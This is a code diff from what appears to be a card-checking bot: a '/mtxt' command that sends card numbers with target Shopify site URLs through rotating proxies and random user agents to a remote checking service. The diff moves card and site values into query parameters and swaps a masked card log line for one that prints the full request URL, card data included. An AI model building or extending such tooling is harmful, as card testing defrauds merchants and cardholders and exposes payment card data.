@@ -6284,7 +6284,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
         const { data: mtxtProxiesRaw } = await supabase.from("user_proxies").select("*").eq("user_id", mtxtProfile.user_id);
         const mtxtProxies = mtxtProxiesRaw || [];
 
-         const SHOPIFY_API_URL_MTXT = "https://web-production-9db0.up.railway.app";
+         const SHOPIFY_API_URL_MTXT = "https://web-production-9db0.up.railway.app/shopify";
          const MTXT_MAX_RETRIES = 1; // Keep /mtxt fast: one hard API retry, then rotate site/card thread
          const MTXT_API_TIMEOUT_MS = 30000;
          const mtxtStartTime = Date.now();
@@ -6351,12 +6351,12 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
 
          // Single API call — exact match of web callApiOnce
           const mtxtBuildApiUrl = (cardCC: string, siteUrl: string, proxy: string) => {
-            // Path-based format: domain/site={site}/cc={cc}
-            const site = encodeURIComponent(siteUrl.trim());
-            const cc = encodeURIComponent(cardCC.trim());
-            let url = `${SHOPIFY_API_URL_MTXT}/site=${site}/cc=${cc}`;
-            if (proxy?.trim()) url += `?proxy=${encodeURIComponent(proxy.trim())}`;
-            return url;
+            // Query param format: domain/shopify?site={site}&cc={cc}
+            const params = new URLSearchParams();
+            params.set("site", siteUrl.trim());
+            params.set("cc", cardCC.trim());
+            if (proxy?.trim()) params.set("proxy", proxy.trim());
+            return `${SHOPIFY_API_URL_MTXT}?${params.toString()}`;
           };
 
           const mtxtCallOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
@@ -6364,7 +6364,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
            const controller = new AbortController();
             const timeout = setTimeout(() => controller.abort(), MTXT_API_TIMEOUT_MS);
            try {
-              console.log(`[MTXT API] card=${cardCC.split('|')[0]?.slice(0, 6)}****${cardCC.split('|')[0]?.slice(-4)} site=${siteUrl} proxy=${proxy ? 'yes' : 'direct'}`);
+              console.log(`[MTXT API] url=${apiUrl}`);
              const resp = await fetch(apiUrl, { method: "GET", headers: { 'Accept': 'application/json, text/plain, */*', 'User-Agent': mtxtUserAgents[Math.floor(Math.random() * mtxtUserAgents.length)], 'Cache-Control': 'no-cache' }, signal: controller.signal });
              clearTimeout(timeout);
              const rawText = await resp.text();
